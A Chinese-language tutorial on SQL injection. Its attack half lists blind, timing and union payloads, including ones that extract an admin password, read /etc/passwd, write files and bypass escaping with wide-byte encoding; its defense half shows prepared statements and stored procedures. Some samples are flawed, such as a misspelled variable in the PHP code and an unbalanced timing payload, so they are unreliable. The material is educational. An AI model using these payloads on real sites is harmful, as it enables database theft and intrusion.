# SQL Injection

## 简介

SQL Injection，即SQL注入，是指攻击者利用服务端对用户输入处理的漏洞，输入一些SQL代码，通过闭合引号等手段使服务器将其作为SQL语句而执行，从而造成攻击者对目标数据库的非授权访问，可能产生数据泄露、损毁、篡改等。

## 姿势

### 错误回显注入

如果Web服务器开启了错误回显，通过对输入内容的报错回显可以推理SQL逻辑从而很容易构造Payload。

### 盲注

多数时候Web服务器并不会提供错误的回显，这时候我们需要借用盲注的技巧。

在盲注的情况下，攻击者需要一种手段来确认输入的Payload所产生的影响，而观察页面的变化是最常用的参照，比如以下Payload：

```js
业务URL：http://example.com/news.php?id=10
SQL逻辑：SELECT title, description, body FROM news WHERE id = 10

攻击Payload: ?id=10 and 1=2，造成查询为空，页面可能为空
```

当然以上Payload显示的页面异常也有可能是服务端检测到了非法Payload而做了处理的结果，所以确认注入点还需要后面的步骤。

```js
?id = 10 and 1=1返回页面正常说明确实有问题。
```

### Timing Attack

通过注入一些执行起来花费时间的SQL语句，观察Web请求的响应时间变化也可以判断是否存在SQL注入漏洞。

常用的函数：

MySQL：

```
benchmark(times,function)，benchmark某个函数function times次数
如benchmark(1000000, encode('hello','goodbye'))
sleep(seconds)，休眠seconds秒。
```

举例一个Payload：

```
10 union select if(substring(current,1,1)=char(119),benchmark(5000000,md5(1)) from (select database() as current) as tbl;
```

## 数据库攻击技巧

### 便利函数

database\(\) - 返回当前数据库名。

system\_user\(\) - 返回数据库的系统用户。

current\_user\(\) - 返回当前用户身份。

version\(\) - 数据库版本号。

### 常见技巧

猜解数据库版本：?id = 5 and substring\(@@version,1,1\)=4

判断表是否存在：?id = 5 union all select 1,2,3 from 表名

判断表中某列是否存在：?id = 5 union all select 1,2,列名 from 某表

具体猜解列中数据：?id = 5 and ascii\(substring\(\(select passwd from admin limit 0,1\),1,1\)&gt;64\) **二分法**

读取文件：?id = 5 union select 1,2,load\_file\('/etc/passwd'\) **需要读权限**

写文件：?id = 5 union select ... into outfile '/file' 或者 into dumpfile 'file'，dumpfile相比outfile更适合二进制文件。

### 攻击存储过程

如sqlserver中的`xp_cmdshell`就是一个存储过程。存储过程一般提前定义，需要通过`call`或者`execute`调用。

### 编码利用

当数据库使用宽字节编码时，Web语言可能考虑不到，会将双字节字符认为是两个字符，而多数情况下为了安全起见，会开启`magic_quotes_gpc`或者使用`addslashes()`函数对特殊字符进行转义，比如单引号和双引号。这里我们注意单引号可以表示为`0x27`，反斜线可以表示为`0x5c`，当攻击者输入`0xbf27 or 1=1`时，Web端会将认为`0xbf27`是两个字符，经过转义，就变成了`0xbf5c27`，这个数据就会被交送数据库处理。而在双字节编码的数据库看来，`0xbf5c`就是一个汉字，于是攻击者成功“吃掉了”反斜线并闭合双引号。

### 攻击思路

### 防御

#### 使用预编译语句

预编译语句事实上是对变量的一种绑定，举例Java中的预编译：

```java
String custname = request.getParameter("customerName"); // 这里的custname需要好好被检查
// custname的检查
String query = "SELECT account_balance FROM user_data WHERE username = ?";

PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1,custname);
ResultSet results = pstmt.executeQuery();
```

在`query`中，我们利用`?`替代查询参数，使得攻击者无法改变SQL逻辑，即便是插入了`abc' or '1'='1`尝试闭合引号也只会被当做username的参数执行。再举一个PHP的例子：

```php
$query = "INSERT INTO myCity (Name, CountryCode, District) VALUES (?,?,?)";
$stmt = $mysqli->prepare($qeury);
$stmt->bind_param("sss",$var1,$var2,$var3);
$val1 = 'var1';
$val2 = 'var2';
$val3 = 'var3';
$stmt->execute();
```

通过对输入变量与查询参数的绑定，将特定的输入限制在参数内，不会使得SQL语义产生变化。

#### 使用存储过程

Java中使用存储过程的例子：

```java
String custname = request.getParameter("customerName"); // check please
try{
    CallableStatement cs = connection.prepareCall("{call sp_getAccountBalance(?)}");
    cs.setString(1, custname);
    ResultSet results = cs.executeQuery();
} catch (SQLException se) {
    // log error
}
```

对比预编译语句的使用发现有些类似，不过这里需要预先定义存储过程`sp_getAccountBalance(?)`，然后使用`call`调用存储过程，在进行变量绑定。不过我们还是需要避免在存储过程中使用动态SQL语句，否则也有可能出现SQL注入。

#### 检查数据类型

很多时候SQL查询需要的只是一个数字型的id，所以我们可以通过限制数据类型过滤掉大部分攻击。

#### 使用安全的函数

各种Web语言都会实现一些编码函数，帮助对抗有可能出现的攻击，比如`addslashes()`，`mysql_real_escape_string()`以及`mysql_escape_string()`等等。中间函数考虑到数据库连接的编码，因此相比其他两种比较不可能出现款字节注入漏洞。基本上就是对特殊字符利用反斜杠转义处理。

